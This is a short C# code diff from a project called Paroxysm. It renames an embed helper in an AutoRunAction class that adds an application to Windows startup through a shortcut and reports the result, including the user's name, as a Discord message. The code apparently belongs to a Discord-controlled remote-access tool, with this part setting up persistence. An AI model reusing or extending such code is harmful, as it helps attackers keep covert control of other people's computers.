@@ -1,5 +1,6 @@
 ﻿using Discord;
 using IWshRuntimeLibrary;
+using Paroxysm.Discord;
 using Paroxysm.Tools;
 
 namespace Paroxysm.Hooks.Actions;
@@ -26,7 +27,7 @@ public static class AutoRunAction
             shortcut.TargetPath = appPath;
             shortcut.Save();
 
-            return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed",
+            return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed",
                 "Application has been added to startup.", Environment.UserName, null);
         }
         catch (Exception exception)
@@ -34,7 +35,7 @@ public static class AutoRunAction
             Logger.ThrowEmbedError(exception);
         }
 
-        return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+        return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
             "Cannot add application to startup.", Environment.UserName, null);
     }
 }
